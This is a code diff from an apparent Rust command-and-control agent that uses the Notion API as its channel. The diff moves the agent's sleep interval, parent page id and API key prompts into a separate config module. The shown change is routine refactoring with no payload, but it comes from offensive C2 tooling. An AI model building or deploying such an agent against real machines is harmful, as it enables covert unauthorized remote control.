@@ -7,63 +7,15 @@ use std::error::Error;
 // use std::io;
 use std::io::{self, Write};
 use std::{thread, time};
+use std::env::{args};
 
 use serde_json::{json};
 
 use reqwest::{Client};
 use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
 
-
-const URL_BASE: &str = "https://api.notion.com/v1";
-// const API_KEY_URL: &str = "http://localhost:8888";
-
-
-/// Storing Config Options as a struct for ergonomics.
-/// 
-/// sleep_interval: u64 for use with `std::thread::sleep()`
-/// 
-/// parent_page_id: String which eventually can be added at compile
-/// 
-/// api_key: String also added at compile
-#[derive(Debug)]
-struct ConfigOptions {
-    sleep_interval: u64,
-    parent_page_id: String,
-    api_key: String
-}
-
-/// Retrieves config options from the terminal.
-/// 
-/// This is tricky because the terminal doesn't async in a normal way. That's why
-/// it's invoked with a tokio::spawn to encapsulate the work in an async thread.
-fn get_config_options() -> Result<ConfigOptions, Box<dyn Error + Send + Sync>> {
-   
-    println!("Getting config options!");
-    let stdin = std::io::stdin();
-    
-    let mut sleep_interval = String::new();
-    print!("[*] Enter agent sleep interval > ");
-    io::stdout().flush()?;
-    stdin.read_line(&mut sleep_interval)?;
-
-    let mut parent_page_id = String::new();
-    print!("[*] Enter parent page id > ");
-    io::stdout().flush()?;
-    stdin.read_line(&mut parent_page_id)?;
-    
-    let mut api_key = String::new();
-    println!("[*] Enter API Key > ");
-    io::stdout().flush()?;
-    stdin.read_line(&mut api_key)?;
-
-    Ok(
-        ConfigOptions { 
-            sleep_interval: sleep_interval.trim().parse().unwrap(),
-            parent_page_id: String::from(parent_page_id.trim()),
-            api_key: String::from(api_key.trim())
-        }
-    )
-}
+mod config;
+use config::{self as config_mod, URL_BASE, ConfigOptions, get_config_options};
 
 /// Creates a new C2 page in Notion.
 /// 
